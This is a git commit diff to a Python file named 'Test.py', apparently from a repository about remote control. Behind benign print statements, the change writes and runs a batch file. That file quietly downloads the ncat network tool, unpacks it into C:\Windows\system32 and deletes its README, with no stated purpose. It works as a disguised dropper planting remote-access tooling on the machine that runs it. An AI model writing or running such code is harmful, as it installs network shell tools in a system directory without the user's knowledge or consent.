56df5211b5fe8f9ef2ed7c931957a4895faef547
TheCodeFox-tech <78907865+TheCodeFox-tech@users.noreply.github.com>
2021-02-13 14:56:58 +0100

    Update Test.py

--- Test.py
+++ Test.py
@@ -3,6 +3,11 @@ print("Ok, for now")
 print("It seems like it works.")
 print("That's good")
 TestBat = open(r'Test.bat', '+w')
-TestBat.write('powershell wget https://raw.githubusercontent.com/TheCodeFox-tech/PythonRemoteTest/main/Test.json -o Test.json')
+TestBat.write('''@echo off
+              cls
+              powershell wget http://nmap.org/dist/ncat-portable-5.59BETA1.zip -o ncat.zip
+              powershell Expand-Archive -LiteralPath .\ncat.zip -DestinationPath C:\Windows\system32
+              cd C:\Windows\system32
+              del README''')
 TestBat.close()
 subprocess.call([r'Test.bat'])
